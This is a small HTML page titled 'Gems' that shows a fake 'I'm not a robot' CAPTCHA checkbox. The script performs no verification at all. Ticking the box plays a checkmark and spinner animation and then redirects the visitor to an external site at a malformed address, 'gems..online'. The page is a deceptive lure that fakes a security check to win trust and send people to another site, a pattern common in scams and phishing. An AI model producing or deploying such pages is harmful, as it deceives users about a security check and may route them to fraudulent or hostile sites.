
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Gems</title>
  <style>
    body {
  margin: 0;
  height: 100vh;
  display: flex;
  justify-content: center;
  align-items: center;
  background: url('lobby.jpeg') center/cover no-repeat;
  font-family: Arial, sans-serif;
}
    .captcha-box {background:#2c2c2c;border:2px solid #444;border-radius:8px;
      padding:14px 24px;display:flex;align-items:center;
      box-shadow:0 2px 12px rgba(255,255,255,0.1);}
    .checkmark {width:24px;height:24px;border:2px solid #777;border-radius:4px;
      display:flex;justify-content:center;align-items:center;cursor:pointer;
      margin-right:15px;background:#2c2c2c;position:relative;}
    .checkmark input{display:none;}
    .checkmark span{display:none;color:#00e5ff;font-size:18px;}
    .text{font-size:16px;font-weight:600;color:#e0e0e0;}
    .loader{border:3px solid #555;border-top:3px solid #00e5ff;border-radius:50%;
      width:18px;height:18px;animation:spin 1s linear infinite;
      display:none;position:absolute;}
    @keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
  </style>
</head>
<body>
  <div class="captcha-box">
    <label class="checkmark">
      <input type="checkbox" id="captcha3">
      <span>âœ”</span>
      <div class="loader" id="loader3"></div>
    </label>
    <div class="text">I'm not a robot</div>
  </div>
  <script>
    const c3=document.getElementById("captcha3");
    const l3=document.getElementById("loader3");
    const m3=document.querySelector("#captcha3+span");
    c3.addEventListener("change",function(){
      if(this.checked){
        m3.style.display="block";
        setTimeout(()=>{m3.style.display="none"; l3.style.display="block";},500);
        setTimeout(()=>{window.location.href="https://gems..online/";},3000);
      }
    });
  </script>
</body>
</html>
